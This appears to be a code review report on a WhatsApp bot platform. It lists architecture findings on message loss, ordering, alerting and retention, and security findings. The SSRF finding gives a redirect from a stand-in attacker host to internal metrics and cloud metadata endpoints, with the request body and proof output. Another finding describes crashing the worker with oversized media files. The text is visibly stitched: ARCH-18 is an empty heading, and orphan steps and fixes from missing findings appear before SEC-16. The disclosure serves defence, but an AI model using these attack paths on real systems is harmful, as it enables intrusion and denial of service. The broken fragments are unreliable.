## HIGH

### ARCH-01 (HIGH): An inbound event is lost after 15 seconds of database or Redis failure

- Files:
  - `apps/api/src/queues/queues.service.ts:19` (`inbound: { attempts: 5, backoff: { type: 'exponential', delay: 1_000 } }`)
  - `apps/api/src/inbound/inbound-ingest.service.ts:124-133` (dedupe key, then `queues.add`)
  - `apps/api/src/conversations/worker/message-received.handler.ts:52-55`
  - `apps/api/src/queues/worker.factory.ts:150-174` (`onFailed`: log and alert only)
- Failure scenario:
  1. Evolution posts `messages.upsert`. The API stores `raw_events`, sets `bc:dedupe:inbound:<key>` for 24 h, adds the job, and answers 200.
  2. PostgreSQL restarts (container update, host maintenance, failover). The restart takes 20 s.
  3. The inbound job fails 5 times in approximately 15 s (1 s, 2 s, 4 s, 8 s). BullMQ moves it to the failed set.
  4. Evolution does not send the event again, because it got 200. A manual resend gets `duplicate` because the dedupe key lives 24 h.
  5. The user message is never stored. The bot never answers. The client never gets `message.received`.
- The same loss occurs when the handler stores the row but the drain fails: the row stays `botPending = true`. No job drains it. The next message of the same contact drains it only if it is younger than 1 h (`PENDING_MAX_AGE_MS`); after that it is skipped as `stale`.
- A crash of the API between `redis.set(... 'NX')` and `queues.add` (lines 124-128) also loses the event: the key stays, and the retry of Evolution is a duplicate.
- Evidence: `grep -rn botPending apps/api/src` shows no sweep or replay of pending rows. No task reads `raw_events` again. No alert rule uses `botcenter_queue_size{state="failed"}`. `WorkerFactory.onFailed` sends one Discord alert for each queue and job name in 5 min, then nothing.
- Architecture: "Perda de evento entre Evolution e Bot Center ... Webhook só enfileira e responde" (the risk table). The code accepts the event and then can drop it.
- Fix:
  1. Give the `inbound` queue a long retry budget for infrastructure errors (for example 12 attempts, exponential from 2 s with a cap of 5 min, about 30 min in total).
  2. Add a maintenance task `sweep-inbound`: it reads `messages` with `botPending = true` and `createdAt` older than 1 min (the partial index `messages_bot_pending_idx` exists) and runs the drain again for each `(instanceId, contact)`.
  3. Add an admin CLI command that replays a `raw_events` row (or a failed inbound job) through the normalizer and the queue, without the dedupe check.
  4. Add a Prometheus rule on `botcenter_queue_size{queue="inbound",state="failed"} > 0`.

### ARCH-02 (HIGH): The bot replies of one conversation can arrive in the wrong order

- Files:
  - `apps/api/src/conversations/worker/conversation-writer.service.ts:143-165` (`writeReplies`: one row for each `send_message` action)
  - `apps/api/src/messages/outbound-messages.service.ts:101-111` (`addBulk`, one independent job for each row)
  - `apps/api/src/messages/outbound-job.ts:18,29-36` (all replies have priority 1; no group or order key)
  - `apps/api/src/config/env.ts:126` (`WORKER_CONCURRENCY_OUTBOUND ... default(10)`)
  - `packages/whatsapp-provider/src/evolution/request-bodies.ts:104-108` and `evolution-provider.ts:243` (Evolution holds the request for `delay` = typing delay)
- Failure scenario:
  1. A step sends two messages: the transition action "Obrigado, Ana! Agora vou perguntar sobre o seu objetivo e a sua rotina de treinos." (90 characters, typing delay 2.7 s) and the `on_enter` list menu of the next state.
  2. Two outbound jobs start at the same time on two worker slots. The token bucket (burst 3) gives a token to each job.
  3. Evolution holds each send for its typing delay (30 ms for each character, 0.8 s to 4 s). The shorter message goes out first.
  4. The user sees the menu before the text that introduces it. The same reorder occurs for the replies to two quick user messages, and after a retry of one job (`not_connected`, 30 s) while the next job succeeds.
- Evidence: `OutboundSender.process` (`outbound-sender.ts:119-138`) has no lock and no order check for the contact. The plan asks for order "por conversa" on the inbound side only; the outbound side has no rule.
- Fix: serialize the sends of one `(instanceId, contact)`. Two options:
  1. Before the send, take a Redis lock `outbound:<instanceId>:<sha256(contact)>`, and send only the oldest `queued` row of that contact (`createdAt, id`). A job of a younger row moves back to the delayed set (`RetryLaterError`) while an older row is `queued`.
  2. Or make the conversation step enqueue only the first reply, and let `markSent` enqueue the next `queued` reply of the same conversation (a chain).
  Add an integration test with two replies of different length and a fake provider that holds each request for `typingDelayMs`.

### ARCH-03 (HIGH): One large inbound video or document can crash the worker process (out of memory)

- Files:
  - `packages/whatsapp-provider/src/evolution/evolution-provider.ts:279-293` (`getBase64FromMediaMessage`, then `Buffer.from(base64, 'base64')`)
  - `packages/whatsapp-provider/src/evolution/http.ts:105` (`text = await response.text()`, no size limit)
  - `apps/api/src/conversations/worker/inbound-media.service.ts:81` (the 16 MiB check runs after the full download)
  - `infra/compose/compose.prod.yml` worker: `--max-old-space-size=768`, memory limit 1 GB; inbound concurrency 10
- Failure scenario:
  1. A user sends a 200 MB video or a 300 MB PDF. WhatsApp accepts files up to 2 GB.
  2. The worker reads the whole JSON body as one string (base64, about 267 MB for 200 MB), parses it (a second copy), and decodes it (a 200 MB `Buffer`).
  3. The heap limit of 768 MB or the container limit of 1 GB stops the process. Above approximately 512 MB of base64, V8 throws `RangeError: Invalid string length`, which is not a `ProviderError`, so the job fails and retries (`inbound-media.service.ts:97-99` rethrows it).
  4. The crash also kills every active job: outbound sends restart after the stall check and can go out two times; the inbound job of the video stalls and runs again, so the crash repeats.
- Evidence: the size check `downloaded.data.length > MEDIA_MAX_BYTES` (line 81) runs only after the full body is in memory. `MEDIA_MAX_BYTES` is 16 MiB (`packages/contracts/src/messages.ts:23`).
- Fix:
  1. Read the declared size of the media (`fileLength` of `imageMessage`, `videoMessage`, `documentMessage`, `audioMessage`) in the normalizer. Skip the download when it is above 16 MiB (`too_large`).
  2. Give the provider HTTP client a maximum response size for `downloadMedia` (for example 24 MiB of base64). Stop the read and throw `ProviderError('rejected')` above it.
  3. Add a test with a fake Evolution answer above the limit.

### ARCH-04 (HIGH): `call_webhook` actions are at most once, so the bot result can be lost

- Files:
  - `apps/api/src/conversations/worker/conversation-runtime.service.ts:50-65` (`drain`: the calls run after all the steps)
  - `apps/api/src/conversations/worker/after-commit.service.ts:46-65` (the calls are returned, not stored)
  - `apps/api/src/conversations/worker/bot-http.ts:120-145` (no retry for a non-2xx answer; 2 attempts for `timeout` and `network` only)
- Failure scenarios:
  1. A drain processes two pending rows. Step 1 commits and returns a `call_webhook` (for example the onboarding result to `ONBOARDING_WEBHOOK_URL`). Step 2 throws (a database error, or `ConversationConflictError` after 3 conflicts). `withLock` throws, `collected` is discarded, and `callWebhooks` never runs. The retry of the job does not run step 1 again, because its row is consumed.
  2. The worker stops (deploy timeout, OOM, see ARCH-03 and ARCH-11) after the commit and before `callWebhooks`.
  3. The client service answers 503 one time. `callWebhook` returns `false` at once (lines 135-139). The data is gone; only a log and an alert remain.
- Architecture: "As ações geram envios ... e webhooks para o serviço dono do bot" and "Entrega de eventos: at-least-once com retentativa exponencial ... e fila de mensagens mortas". Plan decision 240 chose 2 attempts, which conflicts with this rule.
- Fix: write each `call_webhook` as a row in the step transaction (the outbox pattern), for example a `bot_webhook_calls` table or an outbox event with a target URL. Deliver it with the same lease, retry schedule, dead state, and sweep as `webhook_deliveries`. The engine already gives the action data inside the transaction.

### ARCH-05 (HIGH): The production environment template breaks the browser connect stream (CORS)

- Files:
  - `apps/api/src/config/env.ts` (`CONNECT_ALLOWED_ORIGINS: originList`, default `''`)
  - `apps/api/src/instances/connect-cors.ts:20-22` (an empty list sends no CORS header)
  - `infra/env/api.env.example` (no `CONNECT_ALLOWED_ORIGINS` line); `docs/runbook.md` (no mention)
- Failure scenario:
  1. The operator runs `infra/scripts/gen-secrets.sh`. It makes `/etc/botcenter/api.env` from `api.env.example`. The variable is absent, so the list is empty.
  2. The PersonalLife frontend (`https://app.personallife.com.br`) opens `EventSource('https://<bot center host>/v1/connect/<token>/events')`. `EventSource` uses CORS mode.
  3. The answer has no `Access-Control-Allow-Origin`. The browser blocks the stream. The trainer never sees the QR code or the pairing code.
  4. Step 4 of "Fluxo de conexão" fails for the only client product. The token is now used (`usedAt`), so a retry needs a new connect call.
- Evidence: `diff` of the names in `api.env.example` and `env.ts` shows that `CONNECT_ALLOWED_ORIGINS` is missing. Plan decision 226 says: "`infra/` must pass the variable to the API".
- Fix: add `CONNECT_ALLOWED_ORIGINS=https://CHANGE_ME` with a comment to `infra/env/api.env.example`. Add the step to the runbook (go-live checklist). Add the name to the env template test of `tests/infra`, so that a missing documented variable fails the gate.

### ARCH-06 (HIGH): The metric "failure rate for each instance" of the architecture does not exist

- Files: `apps/api/src/metrics/metrics.service.ts:71-75` (`botcenter_messages_total` has only the label `status`); `infra/observability/prometheus/alerts.yml:60-74`.
- Failure scenario: WhatsApp bans one number of ten. All the sends of that number fail. The global rate stays below 5 % when the other nine numbers send more, so `SendFailureRateHigh` and `check-alerts` stay quiet. The operators cannot see which number fails in Grafana.
- Evidence: no metric in `apps/api/src` has an `instance` label (`grep -rn labelNames`). The architecture lists "taxa de `failed` por instância" in "Métricas".
- Fix: add `botcenter_outbound_sends_total{instance_id,result}` (`sent`, `failed`, with the failure reason as a second label if the cardinality is acceptable). Phase 1 has few instances, so the cardinality is small. Add a dashboard panel and a rule: failure share of one instance above 20 % with at least 10 sends in 10 min.

## MEDIUM

### ARCH-07 (MEDIUM): The alert `WebhookDeliveryFailuresHigh` fires for healthy traffic

- Files: `infra/observability/prometheus/alerts.yml:79` (`result!="success"`); `apps/api/src/webhooks/webhook-delivery.worker.ts:93` (`inc({ result: update.status })`, values `succeeded`, `failed`, `dead`).
- Failure scenario: the label value `success` never exists. The numerator counts every delivery, so the ratio is 1.0. When 10 or more deliveries occur in 15 min, the warning fires, also when all of them succeed. The operators learn to ignore it.
- Evidence: `alerts.test.yml` has no test for this rule. The comment at `alerts.yml:11` also says "(success, failure, dead)".
- Fix: use `result=~"failed|dead"` in the numerator. Correct the comment. Add a `promtool` test case with `succeeded` series that must not fire.

### ARCH-08 (MEDIUM): A state timer is lost after a crash or a short Redis error, and nothing repairs it

- Files: `apps/api/src/conversations/worker/after-commit.service.ts:25-45`; `apps/api/src/conversations/conversation-timers.service.ts:44-56`; `apps/api/src/queues/queues.service.ts:21` (`timers: { attempts: 3, ... delay: 5_000 }`).
- Failure scenario:
  1. A step commits the new state with `timeout: { after_seconds: 3600, target: 'sem_resposta' }`.
  2. The worker stops before `timers.schedule`, or Redis refuses the add. `schedule` logs and alerts ("the state has no timeout until the next message").
  3. The conversation waits in the state with no timeout for ever. The `sem_resposta` flow never runs.
  4. A timer job that fails 3 times in about 15 s (PostgreSQL restart) is also lost.
- Evidence: `timerForState` has only one other caller (`conversations.service.ts:158`, the handoff). No sweep compares the conversations with the timer jobs.
- Fix: store the next timer in the step transaction (columns `conversations.timerJobId` and `timerFireAt`, with a partial index). A maintenance task re-adds the job for each row with `timerFireAt` in the past and no live job (the job id is deterministic, so the add is idempotent). Give the `timers` queue a longer retry budget.

### ARCH-09 (MEDIUM): A stale cache entry with `handoff = true` makes the bot ignore messages for up to 1 hour

- Files:
  - `apps/api/src/conversations/worker/conversation-step.service.ts:161-164` (`load(... { fresh })`, then `skip: 'handoff'`), `:318-330`
  - `apps/api/src/conversations/worker/conversation-writer.service.ts:59-68` (`consumeOnly` has no version check)
  - `apps/api/src/conversations/conversation-cache.service.ts:53-60` (a failed delete is only a warning: "A stale entry is safe")
  - `apps/api/src/conversations/worker/conversation-loader.service.ts:31-38` (read PostgreSQL, then `cache.set`)
- Failure scenario:
  1. An operator gives the conversation back to the bot (`POST /v1/conversations/{id}/handoff` with `to: bot`). The API commits `handoff = false` and calls `cache.delete`.
  2. Redis refuses the delete, or a worker loader read PostgreSQL before the commit and writes the old record after the delete.
  3. The next user message: the first attempt uses the cache (`fresh = false`), sees `handoff = true`, and calls `consumeOnly`. The message is consumed without the bot. The version check never runs, because no write occurs.
  4. This repeats for each message until the TTL (1 h) ends.
- Evidence: the comment at `conversation-cache.service.ts:57` assumes that a write always follows a read; the skip path does not write the conversation.
- Fix: before a `handoff` skip, read the conversation from PostgreSQL (`fresh = true`). A handoff is rare, so the cost is small. Or write the cache with a Lua compare-and-set on `version`, so an older record never replaces a newer one.

### ARCH-10 (MEDIUM): The send rate limit makes every waiting job poll PostgreSQL and Redis at each token

- Files: `apps/api/src/messages/token-bucket.ts:34-39` (`wait = ceil((1 - tokens) / rate)`: the time to one token, the same value for every job); `apps/api/src/messages/outbound-sender.ts:119-131,149-165` (load the row from PostgreSQL, then take the token); `apps/api/src/queues/queue-metrics.collector.ts:26-37` (`readyAt = job.timestamp + job.opts.delay`).
- Failure scenario:
  1. A tenant sends 500 bulk messages to a new number. The warm-up gives 4 sends for each minute on day 0 (`20 * 20 %`). The backlog takes about 2 h.
  2. Each job without a token gets the same wake time (the next token). At each token, all the waiting jobs wake: 500 `findFirst` queries on `messages`, 500 Lua calls, and 499 `moveToDelayed` calls, every 15 s. The total cost grows with the square of the backlog.
  3. `job.moveToDelayed` changes the hash field `delay`, not `opts.delay`, and keeps `timestamp`. A promoted job in the `prioritized` set reports its age since creation. A scrape or a `check-alerts` run in that window reports a delay of minutes, and the critical incident "Outbound queue delay above 30 s" opens although the system works as designed. The architecture uses this delay as a trigger to scale the host, which does not help a rate limit.
  4. The sweep reads only the 500 oldest `queued` rows (`outbound-sweep.ts:69-85`). In a large backlog these rows are all `delayed`, so the sweep cannot see newer rows that lost their job.
- Fix: take the token before the database read. Give each denied job a wait of `waitMs + position * (60000 / rate)` (a reservation counter in the Lua script), so the jobs wake one at a time. Compute the queue delay from the time when the job became ready (store it with `job.updateData` or use `job.processedOn`), and leave rate-limited jobs out of the delay alert. Let the sweep page through the rows with a cursor.

### ARCH-11 (MEDIUM): The graceful shutdown time is shorter than the longest job, so a deploy can send a message two times

- Files: `apps/api/src/config/env.ts:122` (`SHUTDOWN_TIMEOUT_MS ... default(25_000)`); `infra/compose/compose.prod.yml:46` (`stop_grace_period: 30s`); `packages/whatsapp-provider/src/evolution/evolution-provider.ts:42-47,243` (send 30 s plus typing delay up to 4 s; media download 60 s; state read 10 s after a failed send); `apps/api/src/common/shutdown.ts:117-121`.
- Failure scenario:
  1. `deploy.sh` stops the worker. A send to a slow Evolution is in progress (up to 30 s + 4 s, plus 10 s for the state read after a 500).
  2. After 25 s, `createShutdown` calls `process.exit(1)`. The send can be on WhatsApp already, but `ambiguousSends` and `providerMessageId` are not in the job.
  3. The new worker finds the stalled job after the lock time (30 s) and sends the message again.
- Architecture: "Workers param com graceful shutdown: terminam o job atual e devolvem o resto à fila".
- Fix: make the shutdown time longer than the longest job: for example `SHUTDOWN_TIMEOUT_MS=75000` and `stop_grace_period: 90s` for the worker only (the API can keep 25 s). Or lower the send and media time limits so that the sum stays below the shutdown time. Add a test that compares the values.

### ARCH-12 (MEDIUM): Conversations and transitions keep personal data with no retention purge (LGPD)

- Files: `prisma/schema.prisma:284-330` (`conversations.contact`, `conversations.variables`, `conversation_transitions`); `apps/api/src/maintenance/batch-purger.ts:14-21` (`PurgeTable` has no conversation table); `apps/api/src/maintenance/purge.tasks.ts:57-88`.
- Failure scenario: the onboarding bot stores `nome`, `objetivo`, and `peso_kg` in `variables`, with the phone in `contact`. The `messages` rows go away after `retentionDays` (90). The conversation rows stay for ever, also after the client stops to use the instance. A data subject request or an audit finds personal data older than the declared retention.
- Evidence: plan section 8, webhooks decision: "Open problems for the orchestrator. `conversations` and `conversation_transitions` keep the phone number of the contact without a retention purge." The code at `3bcaffa` does not close it.
- Architecture: "Retenção curta por padrão ... e job de expurgo".
- Fix: add `purge-conversations` (per tenant): delete conversations with `lastInboundAt` (or `updatedAt`) older than `retentionDays` and not in handoff; the transitions go with `onDelete: Cascade`. Add an index `(tenantId, updatedAt)` on `conversations`. Remove the hot cache key of each deleted row, or keep the TTL of 1 h as the bound.

### ARCH-13 (MEDIUM): Inbound media files can stay in the bucket for ever (orphan objects)

- Files: `apps/api/src/conversations/worker/inbound-media.service.ts:109-117` (upload with a new `uuidV7` key for each attempt); `apps/api/src/conversations/worker/inbound-store.service.ts:177-201` (the row update and the `media_objects` insert come after the upload; `if (updated.count !== 1) return;`).
- Failure scenario:
  1. The upload succeeds. The transaction that writes `media_objects` fails (PostgreSQL error) or another attempt of the same event wins the `updateMany`.
  2. The job retries and uploads the file again with a new key. The first object has no `media_objects` row.
  3. `purge-media-objects` deletes only keys that have a row. The orphan photo or audio of the user stays in R2 with no retention limit.
- Fix: make the key deterministic from the message (`tenants/<tenant>/inbound/<message id>`), so a retry overwrites the same object. Or write the `media_objects` row (status `pending`) before the upload and let the purge delete it in all states.

### ARCH-14 (MEDIUM): `check-alerts` scans two large tables every minute with no index

- Files: `apps/api/src/maintenance/operational-alerts.task.ts:111-116` (`WHERE "direction" = 'outbound' AND "createdAt" >= $1`) and `:142-150` (`WHERE "updatedAt" >= $1` on `webhook_deliveries`).
- Failure scenario: `messages` keeps 90 days of rows and `webhook_deliveries` keeps 30 days. No index has `createdAt` as the first column for `messages` without `tenantId` or `status` (`(status, createdAt)` needs a status value; PostgreSQL 16 has no skip scan). No index on `webhook_deliveries` has `updatedAt`. Both queries read the full table every minute. At some million rows, each run takes seconds of I/O and competes with the send path on a 2 vCPU host.
- Evidence: the index list of `prisma/migrations/*/migration.sql` (`grep -n INDEX`).
- Fix: add `@@index([direction, createdAt])` on `messages` (or query by `status IN ('sent','delivered','read','failed')` with the existing `(status, createdAt)` index), and `@@index([updatedAt])` on `webhook_deliveries`, in an additive migration. Check the plans with `EXPLAIN` in an integration test.

## LOW

### ARCH-15 (LOW): The Prometheus rule `InstanceDisconnected` misses the usual disconnection and never resolves for a parked number

- Files: `infra/observability/prometheus/alerts.yml:20-27` (`botcenter_instances{status="disconnected"} > 0`).
- Problem: plan decision 153 says that Evolution reports a lost connection as `connecting`, not `disconnected`. The rule does not see that case. The application monitor (`connection-monitor.service.ts`) does see it, so the Discord alert works, but Grafana does not. An instance that the owner leaves `disconnected` keeps the critical rule active for ever.
- Fix: export a gauge `botcenter_instance_incidents` (instances with `disconnectedSince` older than 2 min) from the API collector, and alert on it. Remove or relabel the current rule.

### ARCH-16 (LOW): A busy conversation lock holds an inbound worker slot for 2 seconds

- Files: `apps/api/src/conversations/worker/conversation-runtime.service.ts:18-24` (`waitMs: 2_000`); `apps/api/src/services/lock.service.ts:73-78` (a retry every 50 ms).
- Problem: a user sends five short messages in one second. Four jobs wait up to 2 s each (40 `SET NX` calls each) while the holder drains all five rows. With concurrency 10, a few active users delay the messages of all the other conversations.
- Fix: use a short wait (for example 200 ms), or, when the lock is busy, set a Redis flag "drain again" that the holder reads before it releases the lock, and end the job.

### ARCH-17 (LOW): The worker health check is liveness only

- Files: `apps/api/src/metrics/worker-metrics.server.ts:23` (`/health/live` always 200).
- Problem: a worker with closed BullMQ consumers, or with no Redis or PostgreSQL connection, reports healthy to Compose and Uptime Kuma. Only the absence of work shows the problem.
- Fix: add `/health/ready` to the worker listener: PostgreSQL `SELECT 1`, Redis `PING`, and each `Worker.isRunning()`. Use it in Uptime Kuma (not in the Compose restart check).

### ARCH-18 (LOW): Functions longer than 40 lines

### SEC-01 (HIGH): SSRF through Evolution with the media `url` of a message

**Files and lines**

- `packages/contracts/src/messages.ts:118`: `url: HttpsUrl.optional()`. The schema checks only the scheme and the user information.
- `apps/api/src/media/media.service.ts:105-108`: `assertSendable` returns at once when the message has a `url` (no SSRF guard).
- `apps/api/src/media/media.service.ts:132-137`: `toProviderContent` gives `content.url` to the provider without a check.
- `packages/whatsapp-provider/src/evolution/request-bodies.ts:116-127`: the adapter puts the URL in `media` of `POST /message/sendMedia`.
- `infra/compose/compose.prod.yml:183-185`: Evolution is on the networks `internal` and `egress`.
- `apps/api/src/health/health.controller.ts:122-123`: `/metrics` accepts every private address (`@Internal({ secret: false })`).
- The same path applies to a `send_message` action with a media `url` in a bot definition (`StrictMessageContent`).

**Attack scenario**

1. The attacker has an API key with `messages:send` (any tenant) and a connected instance.
2. The attacker puts a file on `https://attacker.example/r.pdf`. The server answers `302 Location: http://api:3000/metrics` (or `http://worker:9464/metrics`, `http://169.254.169.254/hetzner/v1/metadata`, or any host on the `internal` or `egress` network).
3. The attacker sends `POST /v1/messages` with `{"type":"media","media_type":"document","url":"https://attacker.example/r.pdf","file_name":"r.pdf","to":"<attacker phone>"}`.
4. Bot Center does not check the URL. The worker gives it to Evolution.
5. Evolution (Baileys `getHttpStream`, Node `fetch`) follows the redirect from inside the Docker network. The request comes from a private address, so `/metrics` answers.
6. Evolution uploads the body to WhatsApp and sends it as a document to the phone of the attacker. This is a full-read SSRF. The attacker also gets a port scan primitive and an open fetch proxy with the origin IP (the metadata service gives the public IP of the host, which Cloudflare hides).

The architecture says: "a Evolution API nunca recebe tráfego da internet". This path lets a client steer Evolution to any internal address.

**Evidence**

The SSRF guard (`external-http/ssrf-guard.ts`) applies only to webhooks, `external`, and `call_webhook`. `grep -i ssrf` in `messages/`, `media/`, and `bots/` gives no result.

Proof 1 (`proof/evo-fetch-redirect.mjs`, run in the image `evoapicloud/evolution-api:v2.3.7` with `--network none`). The `document` path of Evolution (`prepareMediaMessage` gives `{ url }` to Baileys 7.0.0-rc.9 `getHttpStream`) follows a 302 to an internal HTTP address:

```
baileys getHttpStream body: INTERNAL-METRICS botcenter_jobs_total 42
```

Proof 2 (`proof/evo-redirect.cjs`). The `image` path (`axios.get(mediaMessage.media)`, axios 1.13.2, follow-redirects 1.15.11) also follows the redirect:

```
axios version 1.13.2 body: INTERNAL-SECRET path=/metrics
```

**Fix**

1. Do not give a client URL to Evolution. Download the file in the worker with `ExternalHttpClient` (SSRF guard, no redirects, size limit of 16 MiB, HTTPS only). Put it in the media bucket. Give Evolution only a pre-signed GET URL of the bucket.
2. If a direct URL must stay, apply `SsrfGuard.check()` at `POST /v1/messages` and at `PUT /v1/bots/{id}`. This alone is not sufficient, because Evolution follows redirects and resolves DNS again.
3. Add egress rules in `DOCKER-USER` for the Evolution container: refuse `169.254.0.0/16` and the Docker subnets except PostgreSQL and Redis.
4. Change `/metrics` of the API and of the worker to need a secret header or a separate port that only Alloy can reach.

### SEC-02 (HIGH): an outsider can stop the worker with one large inbound media file

**Files and lines**

- `apps/api/src/conversations/worker/inbound-store.service.ts:173-177`: each inbound media message calls `media.copy()`. No size check comes before the download.
- `packages/whatsapp-provider/src/evolution/evolution-provider.ts:274-289`: `downloadMedia` reads the full base64 JSON body, then `Buffer.from(base64, 'base64')`.
- `packages/whatsapp-provider/src/evolution/http.ts:104-105`: `text = await response.text()` with no size limit.
- `apps/api/src/conversations/worker/inbound-media.service.ts:77-81`: the 16 MiB check runs only after the full decode.
- `infra/compose/compose.prod.yml:144,164`: worker heap 768 MB, container limit 1 GB. `infra/compose/compose.prod.cx22.yml:24,28`: heap 384 MB, limit 512 MB.

**Attack scenario**

1. An outsider knows the WhatsApp number of a connected instance. No key is necessary.
2. The outsider sends two or three documents of 60 MB to 300 MB at the same time. WhatsApp accepts documents up to 2 GB.
3. Each `message.received` job downloads the file through `/chat/getBase64FromMediaMessage`. The worker keeps the base64 text, the parsed JSON, and the buffer in memory at the same time (`WORKER_CONCURRENCY_INBOUND=10`).
4. The container passes its memory limit. Docker kills the worker. All queues of all tenants stop (outbound, webhooks, timers).
5. BullMQ gives the stalled jobs again to the new worker, so the worker crashes again. The outsider can repeat the attack.

**Evidence**

Proof `proof/media-oom.mjs` copies the adapter pattern (`fetch`, `text()`, `JSON.parse`, `Buffer.from`). The peak RSS includes a small local test server:

```
node --max-old-space-size=768, 1 file of 100 MB:  Maximum resident set size 774556 kB
node --max-old-space-size=768, 3 files of 200 MB: Maximum resident set size 2385768 kB  (limit 1 GB)
node --max-old-space-size=384, 1 file of 50 MB:   Maximum resident set size 432316 kB
node --max-old-space-size=384, 2 files of 60 MB:  Maximum resident set size 645780 kB   (CX22 limit 512 MB)
```

A file above about 400 MB fails with `Cannot create a string longer than 0x1fffffe8 characters`. The adapter maps it to `ProviderError`, so only the band from about 50 MB to 400 MB causes the crash. Evolution also builds the full base64 text in its own process (3 GB limit, 1280 MB on CX22). This can also stop Evolution and all WhatsApp sessions. The review did not run this second case.

**Fix**

1. Read the file size from the inbound message (`fileLength` of the WhatsApp media message) in the normalizer. Do not call `downloadMedia` when the size is above `MEDIA_MAX_BYTES`.
2. Give `call()` in `http.ts` a maximum body size (for example `MEDIA_MAX_BYTES * 4 / 3 + 64 KiB`). Read the body as a stream and stop at the limit.
3. Add a regression test with a fake Evolution answer of 100 MB. The test must show a `too_large` result and no large allocation.
4. Limit the concurrency of media downloads (for example, one semaphore of 2 for each worker).

3. Filter `GET /v1/webhooks/deliveries` by the instance of the event for a key with a list.
4. Add integration tests with two keys of one tenant for each route.

2. A client sends many `POST /v1/messages`. Each one writes a `queued` row and gets 202. The enqueue fails, but the sweep adds the jobs later.
3. When Redis returns, the worker sends all the rows. The daily quota and the ban protection of the tenant do not apply to them.

**Fix**

Keep the fail open for reads, but fail closed for `POST /v1/messages` (503 with `Retry-After`) when the quota check cannot run. Alternatively, count the messages of the UTC day in PostgreSQL as a fallback.

### SEC-16 (LOW): `consent_at` has no plausibility check

**Files and lines**

- `packages/contracts/src/instances.ts:39`: `consent_at: IsoDateTime` (any date).
- `apps/api/src/instances/instances.service.ts:102`: `consentAt: new Date(body.consent_at)`.

**Scenario**

A client sends a date in the future or a date of many years ago. The audit then records a consent that is not true. The record has no version of the terms or of the ban notice, so it cannot prove what the end user accepted.

**Fix**

Refuse a `consent_at` later than now plus 5 minutes, or older than 1 day (422). Add an optional `consent_version` (additive contract change) and write it to the audit row.

### SEC-17 (LOW): media uploads have no storage quota, and an upload URL can overwrite the file

**Files and lines**

- `apps/api/src/media/media.service.ts:63-99`: each `POST /v1/media` makes a row and a 16 MiB upload URL. No quota of the tenant applies.
- `apps/api/src/media/media.storage.ts:51-67`: the pre-signed `PUT` stays valid for 15 minutes and can be used many times.

**Scenario**

1. A leaked key with `messages:send` calls `POST /v1/media` 600 times each minute (the default key limit) and uploads 16 MiB each time: about 13.8 TB each day of R2 storage, kept for `retentionDays` (90 days).
2. A client can also replace the file with the same URL after the worker checked it (same size, other bytes). The risk applies only to its own data.

**Fix**

Add `maxMediaBytes` (sum of the declared sizes of the live objects) and `maxMediaUploadsPerDay` to the tenant. Lower the default upload TTL to 5 minutes.
